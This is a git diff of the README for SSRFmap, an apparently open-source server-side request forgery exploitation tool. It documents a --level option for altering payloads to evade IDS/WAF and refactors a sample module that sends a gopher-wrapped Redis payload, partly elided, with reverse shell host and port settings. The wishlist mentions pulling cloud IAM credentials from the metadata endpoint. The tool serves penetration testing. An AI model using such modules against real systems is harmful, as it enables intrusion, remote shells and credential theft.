@@ -40,6 +40,7 @@ python ssrfmap.py -r data/request.txt -p url -m redis --lhost=127.0.0.1 --lport=
 
 # -l create a listener for reverse shell on the specified port
 # --lhost and --lport work like in Metasploit, these values are used to create a reverse shell payload
+# --level : ability to tweak payloads in order to bypass some IDS/WAF. e.g: 127.0.0.1 -> [::] -> 0000: -> ...
 ```
 
 A quick way to test the framework can be done with `data/example.py` SSRF service.
@@ -70,7 +71,6 @@ The following modules are already implemented and can be used with the `-m` argu
 I <3 pull requests :)
 Feel free to add any feature listed below or a new service.
 
-- --level arg - ability to tweak payloads in order to bypass some IDS/WAF. E.g: `127.0.0.1 -> [::] -> 0000: -> ...`
 - aws and other cloud providers - extract sensitive data from http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy and more
 - sockserver  - SSRF SOCK proxy server - https://github.com/iamultra/ssrfsocks
 - handle request with file in requester
@@ -87,28 +87,34 @@ author        = "Name or pseudo of the author"
 documentation = ["http://link_to_a_research", "http://another_link"]
 
 class exploit():
+    SERVER_HOST = "127.0.0.1"
+    SERVER_PORT = "4242"
 
     def __init__(self, requester, args):
         logging.info("Module '{}' launched !".format(name))
 
-        # Using a generator to create the host list - generate tests based on the level
+        # Handle args for reverse shell
+        if args.lhost == None: self.SERVER_HOST = input("Server Host:")
+        else:                  self.SERVER_HOST = args.lhost
+
+        if args.lport == None: self.SERVER_PORT = input("Server Port:")
+        else:                  self.SERVER_PORT = args.lport
+
+        # Data for the service
+        # Using a generator to create the host list
+        # Edit the following ip if you need to target something else
         gen_host = gen_ip_list("127.0.0.1", args.level)
         for ip in gen_host:
+            port = "6379"
+            data = "*1%0d%0a$8%0d%0aflus[...]%0aquit%0d%0a"
+            payload = wrapper_gopher(data, ip , port)
 
-          # Data for the service
-          port = "6379"
-          data = "*1%0d%0a$8%0d%0af[...]save%0d%0aquit%0d%0a"
-          payload = wrapper_gopher(data, ip , port)
+            # Handle args for reverse shell
+            payload = payload.replace("SERVER_HOST", self.SERVER_HOST)
+            payload = payload.replace("SERVER_PORT", self.SERVER_PORT)
 
-          # Handle args for reverse shell
-          if args.lhost == None: payload = payload.replace("SERVER_HOST", input("Server Host:"))
-          else:                  payload = payload.replace("SERVER_HOST", args.lhost)
-
-          if args.lport == None: payload = payload.replace("SERVER_PORT", input("Server Port:"))
-          else:                  payload = payload.replace("SERVER_PORT", args.lport)
-
-          # Send the payload
-          r = requester.do_request(args.param, payload)
+            # Send the payload
+            r = requester.do_request(args.param, payload)
 ```
 
 You can also contribute with a beer IRL or with `buymeacoffee.com`
